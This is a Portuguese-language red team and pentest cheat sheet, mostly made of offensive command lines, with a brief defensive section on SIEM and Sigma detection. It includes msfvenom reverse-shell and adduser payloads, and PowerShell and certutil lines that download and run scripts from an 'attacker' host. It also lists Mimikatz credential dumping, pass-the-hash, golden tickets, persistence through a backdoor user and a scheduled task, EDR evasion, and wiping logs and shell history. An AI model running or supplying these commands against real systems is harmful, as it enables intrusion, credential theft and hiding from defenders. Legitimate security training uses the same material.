# 🛠️ Skills — Comandos Principais

Referência rápida com os principais comandos para cada habilidade de Red Team e Pentest.

---

## 🔴 OFENSIVO

### Red Team
```bash
# Reconhecimento inicial
nmap -sS -Pn -p- target.com           # Scan completo
subfinder -d target.com -o subs.txt   # Enum subdomínios

# Operações de Red Team
metasploit                            # Framework
msfvenom -p windows/meterpreter/reverse_tcp -f exe > shell.exe

# Simular adversário APT
python3 havoc.py -l 0.0.0.0:443       # HAVOC C2 server
```

### Pentest
```bash
# Web application
burpsuite                             # Proxy & scanner
sqlmap -u "http://target.com?id=1" --dbs

# Network penetration
nmap -A -p- target.com                # Aggressive scan
nessus                                # Vuln scanner

# Relatório
cd /reports && generate_report.sh
```

### Privilege Escalation
```bash
# Windows
whoami /priv                          # Ver privilégios
Get-Service | Where Status -eq Running # Serviços rodando
accesschk64.exe -accepteula -nobanner /w "Authenticated Users" c:\
msfvenom -p windows/adduser USER=attacker PASS=P@ssw0rd -f exe
powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

# Linux
sudo -l                               # Ver comandos sudo
find / -perm -4000 2>/dev/null        # SUID binaries
uname -a                              # Kernel version
```

### Lateral Movement
```bash
# Windows AD
Get-ADUser -Filter {adminCount -eq 1} # Admin users
BloodHound                             # Map AD paths
GetUserSPNs.py domain/user:pass        # Kerberoasting

# Pass-the-Hash
secretsdump.py domain/user:pass@target
pth-winexe -U user%hash //192.168.1.100 cmd

# Pass-the-Ticket
GetTGT.py domain/user:pass             # Obter TGT
export KRB5CCNAME=domain.ccache
psexec.py -k -no-pass target
```

### OPSEC (Operational Security)
```bash
# Traffic encryption
apt install tor torsocks               # Anonymize traffic
torsocks curl http://target.com       

# Log cleanup
shred -vfz -n 5 /var/log/*            # Secure delete
history -c && history -w              # Clear bash history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

# Covert channels
dnscat2 server                         # DNS tunneling
ssh -D 9050 user@proxy                # SOCKS5 proxy
```

### EDR Evasion
```bash
# Syscall bypass
python3 syscall_injector.py beacon.exe

# Process injection
python3 process_hollow.py beacon.exe svchost.exe

# String obfuscation
dotnet obfuscator.exe input.dll

# Signature bypass
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 5 -f exe
```

### Post-Exploitation
```bash
# Credential dumping
mimikatz.exe
sekurlsa::logonpasswords              # Dump LSASS
lsadump::sam                           # Dump SAM
hashdump                               # Metasploit module

# Persistence
persistence -X -i 60                   # Metasploit persistence
New-LocalUser -Name "backdoor"         # Create user (PowerShell)
schtasks /create /tn "Update" /tr "C:\beacon.exe" /sc minute /mo 5

# Lateral Movement Post-Exploitation
run hashdump                           # Get hashes
use exploit/windows/smb/psexec         # Spread with psexec
```

---

## 🛠️ FERRAMENTAS

### Burp Suite
```bash
# Start Burp
java -jar burpsuite_community.jar

# Scan aplicação
# 1. Configurar proxy (127.0.0.1:8080)
# 2. Target → Scope → add target
# 3. Scanner → Scan → active
# 4. Issues → Review findings

# Intruder (brute force)
Intruder → Positions → set payload markers
Payloads → Load wordlist
Start attack
```

### BloodHound
```bash
# Coletar dados
SharpHound.exe -c All                 # Windows
BloodHound.py -d domain.com -u user -p pass -gc dc.domain.com

# Executar Neo4j
cd BloodHound && sudo ./BloodHound --no-sandbox

# Analisar
Upload data → Find Shortest Path to DA
Query: MATCH (u:User) RETURN u
```

### CrackMapExec
```bash
# Enum shares
crackmapexec smb 192.168.1.0/24       # Discover hosts
crackmapexec smb 192.168.1.100 -u user -p pass --shares

# Check credentials
crackmapexec smb 192.168.1.100 -u users.txt -p pass.txt --continue-on-success

# Remote execution
crackmapexec smb 192.168.1.100 -u admin -p pass -x "whoami"

# Pass-the-hash
crackmapexec smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e -x "ipconfig"
```

### Nmap
```bash
# Quick scan
nmap -F target.com                    # Top 100 ports
nmap -sS -Pn -p- target.com           # All TCP ports

# Service detection
nmap -sV -sC target.com               # Version + scripts

# Aggressive
nmap -A -p- target.com                # OS + version + scripts

# Firewall/IDS evasion
nmap -f -D RND:5 target.com           # Fragment + decoys
nmap --data-length 100 target.com     # Pad packets

# Output
nmap -oA results target.com           # All formats
```

### Metasploit
```bash
# Start
msfconsole

# Buscar exploit
search exploit_name
search type:exploit platform:windows privilege_escalation:true

# Use exploit
use exploit/windows/psexec
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Post-exploitation (no meterpreter)
use post/windows/gather/hashdump
set SESSION 1
run
```

### SQLMap
```bash
# Auto-detect injection
sqlmap -u "http://target.com/page?id=1" --dbs

# Specify injection point
sqlmap -u "http://target.com/page?id=1*" --dbs

# Crawl & test
sqlmap -u "http://target.com" --crawl=2 --batch

# Dump table
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Reverse shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### Impacket
```bash
# GetUserSPNs (Kerberoasting)
GetUserSPNs.py domain/user:pass -request

# GetNPUsers (ASREPRoasting)
GetNPUsers.py domain/ -usersfile users.txt

# Secret dump
secretsdump.py domain/user:pass@target

# PSExec
psexec.py domain/user:pass@target cmd

# Ticketer (create golden ticket)
ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> Administrator
```

### Mimikatz
```bash
# Dump credentials (LSASS)
privilege::debug
sekurlsa::logonpasswords
sekurlsa::minidump lsass.dmp

# Dump SAM
lsadump::sam

# Create golden ticket
kerberos::golden /user:Administrator /sid:S-1-5-21-... /krbtgt:hash /ticket:ticket.kirbi

# Pass-the-ticket
kerberos::ptt ticket.kirbi
```

---

## 🌐 AMBIENTES & FRAMEWORKS

### Active Directory
```bash
# PTES enumeration
net user administrator /domain        # User info
net group "Domain Admins" /domain     # Group members
nltest /dclist:domain.com             # Find DC

# PowerShell enumeration
Get-ADUser -Filter * | select Name,Enabled,LastLogonDate
Get-ADGroup -Filter {adminCount -eq 1}
Get-ADComputer -Filter * | select Name

# BloodHound
SharpHound.exe -c All

# Attack paths
https://bloodhound.readthedocs.io/
```

### Windows Exploitation
```bash
# Kernel exploits
wes.py systeminfo.txt                 # Find CVEs

# Service vulnerabilities
accesschk64.exe -accepteula -nobanner /w "Authenticated Users" c:\

# UAC bypass
Invoke-UACBypass

# Process injection
.\InMemoryInjection.ps1

# File transfer
certutil -urlcache -split -f http://attacker/file.exe file.exe
iex(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```

### Linux Exploitation
```bash
# Kernel CVEs
searchsploit kernel_version

# SUID binary abuse
find / -perm -4000 2>/dev/null

# Sudo privilege escalation
sudo -l                               # Check sudo perms
GTFOBins                              # Find escape vectors

# Container escape
docker ps && cat /etc/hostname
```

### MITRE ATT&CK
```bash
# Reference framework
https://attack.mitre.org/

# Map technique
# Example: T1110 = Brute Force
# Tactic: TA0006 = Credential Access

# ATT&CK Mapping
T1210 - Exploitation of Remote Services
T1566 - Phishing
T1190 - Exploit Public-Facing Application
```

### TTPs (Tactics, Techniques, Procedures)
```bash
# Document your TTPs
Red Team Playbook:

1. Reconnaissance (OSINT, network recon)
2. Weaponization (payload creation)
3. Delivery (phishing, watering hole)
4. Exploitation (vulnerability abuse)
5. Installation (persistence)
6. C2 (establish command & control)
7. Actions on Objectives (data exfil, lateral movement)
```

---

## 🛡️ DEFENSIVO

### SIEM / Log Analysis
```bash
# ELK Stack
./elasticsearch
./kibana

# Query Elasticsearch
curl -X GET "localhost:9200/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match": { "source": "windows" }
  }
}
'

# Splunk search
index=windows EventCode=4688 Image="*powershell*"
index=windows EventCode=3 DestinationPort=443 DestinationIp!="trusted_ip"
```

### Incident Response
```bash
# Forensics
volatility -f memory.dump imageinfo   # Analyze memory
autopsy memory.dump                   # Memory forensics

# Log collection
wevtutil.exe export-log Security -f Text > Security.txt
journalctl -b > system.log

# Timeline
timeline_tool log1.txt log2.txt log3.txt > timeline.csv
```

### Threat Detection
```bash
# Sigma rules (generic)
https://github.com/SigmaHQ/sigma/tree/master/rules/windows

# Example detection
title: Suspicious PowerShell Command
detection:
  selection:
    CommandLine|contains:
      - 'IEX'
      - 'DownloadString'
  condition: selection

# Splunk implementation
index=windows process=powershell.exe CommandLine="*IEX*"
```

### Detection Rule Tuning
```bash
# Reduce false positives
1. Whitelist: Add known good behavior
2. Baseline: Understand normal traffic
3. Correlate: Combine multiple indicators
4. Alert: Only on high-confidence events

# Rule example
# Alert on: Outbound to suspicious IP + file creation in temp
| stats dc(DestinationIp) as unique_ips by SourceIp
| where unique_ips > threshold
| join ComputerName
  [search FileCreated IN ("*\\temp\\*", "*\\appdata\\*")
   by ComputerName]
```

---

## 📊 Comandos Rápidos (Cheatsheet)

### Recon
```bash
nmap -A target                        # Full scan
subfinder -d target -o subs.txt       # Enum subdomains
nuclei -l subs.txt -t ./templates     # Scan vulns
```

### Exploit
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe
psexec.py domain/user:pass@target
sqlmap -u "url?id=1" --dbs
```

### Post-Exploitation
```bash
mimikatz.exe > lsadump::sam
Get-ADUser -Filter * -Properties * | export-csv ad_users.csv
```

### Defensive
```bash
curl -X GET "localhost:9200/_search" # Query SIEM
wevtutil.exe export-log Security     # Extract logs
```

---

## 📚 Recursos

- [MITRE ATT&CK](https://attack.mitre.org/)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [OffensiveSecurity](https://www.offensive-security.com/)
